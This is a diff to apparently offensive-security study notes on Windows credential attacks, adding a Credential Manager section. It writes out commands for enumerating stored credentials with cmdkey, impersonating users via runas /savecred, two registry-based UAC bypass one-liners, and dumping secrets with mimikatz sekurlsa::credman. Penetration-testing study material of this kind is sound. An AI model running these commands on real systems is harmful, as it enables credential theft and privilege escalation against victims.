@@ -1909,7 +1909,7 @@ The Data Protection Application Programming Interface (DPAPI) is a set of Window
 | Remote Desktop Connection| Saved credentials for connections to remote machines.                                          |
 | Credential Manager       | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.    |
 
-DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).
+DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/ParrotSec/mimikatz/tree/master), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).
 
 <!-- TODO: ADD EXAMPLES  -->
 
@@ -1947,9 +1947,6 @@ Upon initial logon, LSASS will:
 * Create [access tokens](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
 * Enforce security policies
 * Write to Windows' [security log](https://learn.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)
-
-<details>
-<summary><h3>Attacking LSASS</h3></summary>
 
 Before extracting credentials from LSASS, it's wise to first create a memory dump of the LSASS process. This allows us to analyze its contents offline from our attack host. Performing the attack offline provides greater flexibility—enabling faster processing and reducing the time spent on the target system, which helps minimize detection risk.
 
@@ -2106,6 +2103,159 @@ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rocky
 </details>
 
 </details>
+
+<details>
+<summary><h2>Attacking Windows Credential Manager</h2></summary>
+
+Introduced in Windows 7/Server 2008 R2, Credential Manager serves as a proprietary vault for storing authentication details (domain, web, and application credentials) in encrypted form. While Microsoft's internal workings remain undocumented, research reveals credentials are stored in protected locations:
+
+* `%UserProfile%\AppData\Local\Microsoft\Vault\`
+* `%UserProfile%\AppData\Local\Microsoft\Credentials\`
+* `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
+* `%ProgramData%\Microsoft\Vault\`
+* `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`
+
+Each vault folder contains a Policy.vpol file with AES keys (AES-128 or AES-256) that is protected by DPAPI. These AES keys are used to encrypt the credentials. Newer versions of Windows make use of Credential Guard to further protect the DPAPI master keys by storing them in secured memory enclaves ([Virtualization-based Security](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)).
+
+<details>
+<summary><h3>Windows Vault and Credential Manager</h3></summary>
+
+Microsoft often refers to the protected credential stores as Credential Lockers (previously known as Windows Vaults). While Credential Manager serves as the user-facing interface and API, the actual credentials are stored in encrypted vault or locker folders on the system.The following table lists the two types of credentials Windows stores:
+
+| Name                | Description |
+|---------------------|-------------|
+| **Web Credentials** | Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge. |
+| **Windows Credentials** | Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories. |
+
+**Exporting credentials**
+
+It is possible to export Windows Vaults to .crd files either via Control Panel or with the following command:
+
+```cmd
+rundll32 keymgr.dll,KRShowKeyMgr
+```
+
+</details>
+
+<details>
+<summary><h3>Enumerating credentials with cmdkey</h3></summary>
+
+We can use [cmdkey](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) to enumerate the credentials stored in the current user's profile:
+
+If you're using xFreeRDP, you can share [Mimikatz](https://github.com/ParrotSec/mimikatz/tree/master) with the remote system by mounting a local folder as a shared drive:
+
+```bash
+xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASSWORD> /drive:share,/home/<USER>/mimikatz
+```
+
+> This command maps the local /home/<USER>/mimikatz directory to a drive named share on the remote desktop session, allowing easy access to the Mimikatz binaries from within the RDP environment.
+
+1. **Verify the current user**
+
+```cmd
+whoami
+```
+
+2. **Enumerate the credentials**
+
+```cmd
+cmdkey /list
+```
+
+Expected output
+
+Currently stored credentials:
+
+```cmd
+Target: WindowsLive:target=virtualapp/didlogical
+Type: Generic
+User: 02hejubrtyqjrkfi
+Local machine persistence
+
+Target: Domain:interactive=SRV01\herman
+Type: Domain Password
+User: SRV01\herman
+```
+
+Stored credentials are listed with the following format:
+
+| Key          | Value Description |
+|--------------|-------------------|
+| **Target**   | The resource or account name the credential is for. This could be a computer, domain name, or a special identifier. |
+| **Type**     | The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons. |
+| **User**     | The user account associated with the credential. |
+| **Persistence** | Indicates whether a credential is saved persistently on the computer. Credentials marked with `Local machine` persistence survive reboots. |
+
+3. **Use runas to impersonate the stored user like so**
+
+```cmd
+runas /savecred /user:SRV01\herman cmd
+```
+
+4. **UAC Bypass Techniques**
+
+Option 1: FodHelper Exploit
+
+```cmd
+reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
+```
+
+Option 2: ComputerDefaults Exploit 
+
+```cmd
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
+```
+
+5. **Navigating to Administrator Profile**
+
+```cmd
+cd C:\Users\Administrator
+```
+
+6. **Clear registry modifications post-exploitation**
+
+```cmd
+reg delete HKCU\Software\Classes\ms-settings /f
+```
+
+</details>
+
+<details>
+<summary><h3>Extracting credentials with Mimikatz</h3></summary>
+
+**Launch Mimikatz**
+
+```cmd
+mimikatz.exe
+```
+
+**Enable Debug Privileges**
+
+```cmd
+mimikatz # privilege::debug
+```
+
+**Dump Credential Manager Secrets**
+
+```cmd
+mimikatz # sekurlsa::credman
+```
+
+> Note: Some other tools which may be used to enumerate and extract stored credentials included **SharpDPAPI**, **LaZagne**, and **DonPAPI**.
+
+
+
+</details>
+
+</details>
+
+<details>
+<summary><h2>Attacking Active Directory and NTDS.dit</h2></summary>
+
+</details>
+
+<details>
+<summary><h2>Credential Hunting in Windows</h2></summary>
 
 </details>
 
